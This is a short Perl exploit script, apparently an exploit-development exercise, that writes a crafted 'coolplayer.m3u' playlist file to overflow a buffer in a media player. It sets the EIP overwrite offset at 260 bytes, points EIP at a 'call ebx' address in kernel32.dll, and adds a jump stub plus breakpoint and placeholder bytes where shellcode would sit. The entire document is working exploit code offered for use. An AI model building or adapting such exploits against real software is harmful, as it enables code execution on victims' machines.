#!/usr/bin/perl

my $buffsize = 10000;					                #set consistent buffer size

my $jmp = "\x83\xc3\x64" x 3;				            #ADD EBX,300 ; x3
$jmp = $jmp . "\xff\xe3";				                #JMP EBX

my $junk = "\x41" x (260 - length($jmp));		        #offset to EIP
my $eip = pack('V', 0x7c8103d5);			            #call ebx from kernel32.dll

my $nops = "\xcc" x 50;
my $shell = "\x43" x 200;

my $sploit = $jmp.$junk.$eip.$nops.$shell;		        #exploit portion of buffe
my $fill = "\x43" x ($buffsize - (length($sploit)));	#fill remainder of buffer
my $buffer = $sploit.$fill;			                	#build final buffer

#write the exploit buffer to file
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";
